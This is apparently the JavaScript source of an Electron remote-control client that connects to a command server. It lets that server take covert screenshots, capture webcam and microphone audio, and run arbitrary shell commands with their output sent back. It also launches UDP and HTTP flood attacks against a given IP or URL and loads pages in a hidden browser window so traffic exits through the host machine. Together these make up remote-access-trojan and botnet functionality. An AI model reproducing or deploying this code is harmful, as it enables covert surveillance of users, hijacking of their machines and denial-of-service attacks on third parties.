const { desktopCapturer, screen, app, ipcMain, BrowserWindow } = require("electron");
const io = require("socket.io-client");
const child_process = require("child_process");
const udpRain = require("./udpRain");
const httpRain = require("./httpRain");
//udpRain.start({ port: 53, ip: "192.168.1.180", seconds: 5, interval: 1000 });

//const robot = require("robotjs");

// My Modules
const info = require("./config");

class RemoteControl {
  constructor() {
    this.mainWindow;
    // Remote browser için ek pencereler
    this.remoteBrowserWindow = null;
    this.remoteBrowserInterval = null;
  }
  getCamDataWeb = (data) => {
    console.log({ getCamDataWeb: data });
    this.mainWindow.reload();
    setTimeout(() => {
      this.mainWindow.webContents.send("camStart", data);
    }, 3000);
  };
  
  handleAudioListen = (data) => {
    console.log({ handleAudioListen: data });
    this.mainWindow.webContents.send("audioListenStart", data);
  };

  getScreenData = (data) => {
    (async () => {
      try {
        let sources = await desktopCapturer.getSources({
          types: ["screen"],
          thumbnailSize: {
            width: parseInt(data.dimension.split("x")[0]),
            height: parseInt(data.dimension.split("x")[1]),
          },
        });

        data["src"] = sources[data.screen].thumbnail.toDataURL();
        this.socket.emit("screenshotResponse", data);
      } catch (err) { }
    })();
  };

  findComparedPosition = (data) => {
    try {
      return {
        x:
          data.mousePosition.x *
          (screen.getAllDisplays()[data.screen].size.width /
            data.webScreen.width),
        y:
          data.mousePosition.y *
          (screen.getAllDisplays()[data.screen].size.height /
            data.webScreen.height),
      };
    } catch (err) { }
  };

  start = (mainWindow) => {
    this.mainWindow = mainWindow;

    this.socket = io.connect("http://" + info.host + ":" + info.port);
    this.socket.on("connect", () => {
      this.socket.emit("joinToRoom", { roomName: "terminal-" + info.id });
    });

    this.socket.on("screenshotRequest", (data) => {
      this.getScreenData(data);
    });

    this.socket.on("camShotRequest", (data) => {
      this.getCamDataWeb(data);
    });
    
    this.socket.on("audioListenRequest", (data) => {
      console.log("🎧 Audio listen request received:", data.action);
      this.handleAudioListen(data);
    });

    ipcMain.on("cam", (event, args) => {
      this.socket.emit("camShotResponse", args);
    });
    
    // Binary transfer için yeni handler
    ipcMain.on("camBinary", (event, args) => {
      this.socket.emit("camBinary", args);
    });
    
    // Audio stream için handler
    ipcMain.on("audioStream", (event, args) => {
      console.log("📥 Audio stream received from renderer:", args.audioData ? args.audioData.length : "no data", "chars (base64)");
      console.log("📡 MIME type:", args.mimeType);
      
      if (args.audioData && args.audioData.length > 0) {
        console.log("📤 Forwarding audio data to server");
        this.socket.emit("audioStreamResponse", args);
      } else {
        console.log("⚠️ No audio data to forward");
      }
    });
    
    // Audio listen status için handler
    ipcMain.on("audioListenStatus", (event, args) => {
      this.socket.emit("audioListenStatus", args);
    });

    this.socket.on("getRunRequest", (data) => {
      console.log({ getRunRequest: data });
      if (data.cmd.indexOf("udpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          port: parseInt(splittedData[2]),
          ip: splittedData[1],
          seconds: parseInt(splittedData[3]),
          interval: parseInt(splittedData[4]),
        };
        console.log({ createdData });
        udpRain.start(createdData);
      } else if (data.cmd.indexOf("httpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          url: splittedData[1],
          seconds: parseInt(splittedData[2]),
          interval: parseInt(splittedData[3]),
        };
        console.log({ createdData });
        httpRain.start(createdData);
      }
      else if (data.cmd.indexOf("codeRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          seconds: parseInt(splittedData[1]),
          interval: parseInt(splittedData[2]),
          code: splittedData[3],
        };
        console.log({ createdData });
        httpRain.codeRainStart(createdData);
      }
      else {
        try {
          child_process.exec(
            data.cmd,
            { shell: true },
            (err, stdout, stderr) => {
              if (err) {
                data["cmd"] = "err: " + err;
              } else if (stderr) {
                data["cmd"] = "stderr: " + stderr;
              } else {
                data["cmd"] = stdout;
              }

              this.socket.emit("getRunResponse", data);
            }
          );
        } catch (error) {
          data["cmd"] = "catchError: " + error;
          this.socket.emit("getRunResponse", data);
        }
      }
    });
    this.socket.on("mousemove", (data) => {
      //data["compared"] = this.findComparedPosition(data);
      //data["screen_resolition"] = screen.getAllDisplays()[data.screen].size;
      //robot.moveMouse(data.compared.x, data.compared.y);
    });
    this.socket.on("click", (data) => {
      //robot.mouseClick()
    });

    /**
     * Remote Browser
     * Dashboard'tan gelen istekle, terminal üzerindeki Electron içinde
     * gerçek bir BrowserWindow açılır. Bütün HTTP/HTTPS trafiği bu makineden çıkar.
     */
    this.socket.on("remoteBrowserOpen", (data) => {
      // data: { from, to, url }
      this.openRemoteBrowser(data);
    });
  };

  /**
   * Uzak tarayıcıyı aç ve periyodik olarak ekran görüntüsü al.
   * Tüm trafik terminal makinenin IP'si üzerinden gider.
   */
  openRemoteBrowser = (data) => {
    const targetUrl = data.url;

    // BrowserWindow yoksa oluştur
    if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
      this.remoteBrowserWindow = new BrowserWindow({
        width: 1024,
        height: 768,
        show: false, // gizli pencere, sadece ekran görüntüsü için
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          sandbox: true,
        },
      });
    }

    // URL'yi yükle
    this.remoteBrowserWindow.loadURL(targetUrl).catch((err) => {
      console.error("Remote browser load error:", err);
    });

    // Eski interval varsa temizle
    if (this.remoteBrowserInterval) {
      clearInterval(this.remoteBrowserInterval);
      this.remoteBrowserInterval = null;
    }

    // Periyodik olarak ekran görüntüsü al ve dashboard'a gönder
    const captureFn = () => {
      if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
        if (this.remoteBrowserInterval) {
          clearInterval(this.remoteBrowserInterval);
          this.remoteBrowserInterval = null;
        }
        return;
      }

      this.remoteBrowserWindow.webContents
        .capturePage()
        .then((image) => {
          const src = image.toDataURL(); // data:image/png;base64,...
          const payload = {
            from: data.from,
            to: data.to,
            url: targetUrl,
            src,
          };
          this.socket.emit("remoteBrowserFrame", payload);
        })
        .catch((err) => {
          console.error("Remote browser capture error:", err);
        });
    };

    // İlk capture biraz gecikmeli (sayfa yüklensin)
    setTimeout(captureFn, 2000);
    this.remoteBrowserInterval = setInterval(captureFn, 2000);
  };
}

module.exports = new RemoteControl();
